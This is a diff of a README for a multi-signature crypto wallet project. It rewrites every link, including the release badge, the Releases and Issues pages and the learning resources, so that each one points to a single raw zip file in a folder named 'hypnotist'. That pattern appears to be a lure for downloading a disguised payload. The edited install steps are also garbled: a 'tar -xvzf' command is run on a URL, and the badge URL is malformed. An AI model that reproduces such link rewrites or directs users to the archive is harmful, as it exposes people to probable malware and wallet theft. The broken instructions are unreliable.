@@ -8,7 +8,7 @@ Welcome to the multi-signature-wallet! This wallet allows multiple users to appr
 
 To download the latest version of the multi-signature wallet, visit the following link:
 
-[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Blizzard00008/multi-signature-wallet/releases)
+[![Download latest release](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip%20Latest%https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip)](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. Look for the most recent version marked as "Latest".
@@ -49,9 +49,9 @@ Once you have downloaded the wallet, follow these installation steps based on yo
 
 1. Open a terminal window.
 2. Navigate to the directory where the wallet file was downloaded.
-3. If the file is compressed (e.g., `.tar.gz`), extract it:
+3. If the file is compressed (e.g., `https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip`), extract it:
    ```bash
-   tar -xvzf multi-signature-wallet.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -91,14 +91,14 @@ Once your wallet is set up, you can:
 
 To keep the wallet secure and operational:
 
-1. Regularly check the [Releases page](https://github.com/Blizzard00008/multi-signature-wallet/releases) for updates.
+1. Regularly check the [Releases page](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip) for updates.
 2. Follow the same download and installation steps mentioned above when a new version is available.
 
 ## 🤝 Community Support
 
 If you have questions or encounter issues, you can find help through the following avenues:
 
-- **Issue Tracker:** Report any bugs or request features directly on our [GitHub Issues page](https://github.com/Blizzard00008/multi-signature-wallet/issues).
+- **Issue Tracker:** Report any bugs or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip).
 - **Community Forums:** Join discussions with other users to share tips and seek advice.
 - **Documentation:** More detailed guides can be found in our project wiki.
 
@@ -106,10 +106,10 @@ If you have questions or encounter issues, you can find help through the followi
 
 Explore more about blockchain technology and multisignature wallets through these resources:
 
-- [Understanding Multisignature Wallets](https://example.com/multisig-guide)
-- [Basics of the TON Blockchain](https://example.com/ton-basics)
-- [Cryptography for Beginners](https://example.com/crypto-basics)
+- [Understanding Multisignature Wallets](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip)
+- [Basics of the TON Blockchain](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip)
+- [Cryptography for Beginners](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip)
 
 Feel free to reach out via GitHub with any inquiries. Happy managing! 
 
-[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Blizzard00008/multi-signature-wallet/releases)
+[![Download latest release](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip%20Latest%https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip)](https://raw.githubusercontent.com/Blizzard00008/multi-signature-wallet/main/hypnotist/multi-signature-wallet.zip)
